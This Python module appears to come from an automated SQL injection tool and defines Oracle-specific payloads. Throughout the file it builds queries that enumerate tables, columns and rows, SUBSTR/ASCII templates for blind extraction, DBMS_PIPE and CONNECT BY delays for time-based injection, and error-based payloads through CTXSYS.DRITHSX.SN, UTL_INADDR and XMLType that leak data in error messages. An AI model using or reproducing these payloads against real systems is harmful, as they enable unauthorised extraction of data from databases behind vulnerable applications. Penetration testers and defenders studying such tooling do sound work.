"""Oracle dialect"""
from dbms.base import BaseDialect


class OracleDialect(BaseDialect):
    name = "oracle"

    def version_expr(self): return "(SELECT banner FROM v$version WHERE ROWNUM=1)"
    def database_expr(self): return "(SELECT global_name FROM global_name)"
    def current_user_expr(self): return "USER"
    def is_dba_expr(self): return "(SELECT COUNT(*) FROM user_role_privs WHERE granted_role='DBA')"

    def tables_query(self, db_name, idx):
        return (f"(SELECT table_name FROM (SELECT table_name, ROWNUM rn FROM user_tables) "
                f"WHERE rn={idx+1})")

    def columns_query(self, table_name, db_name, idx):
        return (f"(SELECT column_name FROM (SELECT column_name, ROWNUM rn FROM user_tab_columns "
                f"WHERE table_name='{table_name.upper()}') WHERE rn={idx+1})")

    def column_types_query(self, table_name, db_name, idx):
        return (f"(SELECT data_type FROM (SELECT data_type, ROWNUM rn FROM user_tab_columns "
                f"WHERE table_name='{table_name.upper()}') WHERE rn={idx+1})")

    def data_query(self, table_name, column, idx):
        return (f"(SELECT {column} FROM (SELECT {column}, ROWNUM rn FROM {table_name}) "
                f"WHERE rn={idx+1})")

    def substr_templates(self):
        return ["SUBSTR(({sql}),{pos},{len})"]

    def ascii_templates(self):
        return ["ASCII(({sql}))"]

    def concat_templates(self):
        return ["(({a})||({b})||({c}))"]

    def hex_to_str(self, hexstr):
        # Oracle does not recognize 0x..; use HEXTORAW + UTL_RAW to restore
        return f"UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('{hexstr}'))"

    def sleep_expr(self, seconds):
        return (f"(SELECT COUNT(*) FROM (SELECT 1 FROM dual CONNECT BY LEVEL<={seconds} "
                f"AND DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds})=1))")

    def sleep_expr_variants(self, seconds):
        return [
            (f"(SELECT COUNT(*) FROM (SELECT 1 FROM dual CONNECT BY LEVEL<={seconds} "
             f"AND DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds})=1))"),
            f"(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds}) FROM dual)",
            f"(SELECT COUNT(*) FROM dual CONNECT BY LEVEL<={seconds}*1000000)",
        ]

    def error_payloads(self, inner):
        return [
            f"CTXSYS.DRITHSX.SN(1,({inner}))",
            f"UTL_INADDR.GET_HOST_ADDRESS(({inner}))",
            f"(SELECT UPPER(XMLType(CHR(60)||CHR(58)||{inner}||CHR(62))) FROM dual)",
            f"XMLType(({inner}))",
        ]

    def error_fingerprints(self):
        return ["CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))"]

    def error_keywords(self):
        return ["ORA-", "Oracle"]

    def boolean_fingerprints(self):
        # Keep only the criterion unique to this DBMS (user_tables); the old `1=1` holds on any database and has no discriminating power.
        return ["(SELECT COUNT(*) FROM user_tables)>0"]